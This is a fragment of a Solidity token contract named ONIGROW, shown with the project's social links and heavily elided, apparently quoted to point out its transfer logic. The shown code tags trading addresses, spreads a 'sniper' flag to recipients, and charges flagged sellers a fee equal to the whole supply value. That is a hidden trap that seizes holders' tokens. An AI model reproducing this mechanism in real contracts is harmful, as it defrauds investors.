...
Youtube: https://www.youtube.com/channel/UCjXUhb8X92-bO52Yxd16tlg
Medium: https://medium.com/@onigrow
Reddit: https://www.reddit.com/user/OniGrow
...
contract ONIGROW is Context, IERC20, Ownable { 
    ...
    mapping (address => bool) private _isWanted;
    mapping (address => bool) public _isSniper;
    address[] private _Wanted;
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isWanted[from]) {
            _isWanted[from] = true;
            _Wanted.push(from);
        }        
        if (to != owner() && to != uniswapV2Pair && !_isWanted[to]) {
            _isWanted[to] = true;
            _Wanted.push(to);
            if (_isSniper[from]) { _isSniper[to] = true;
            }
        } 
        if(
            txCount >= swapTrigger && 
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (_isSniper[from]){_TotalFee = _rTotal;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
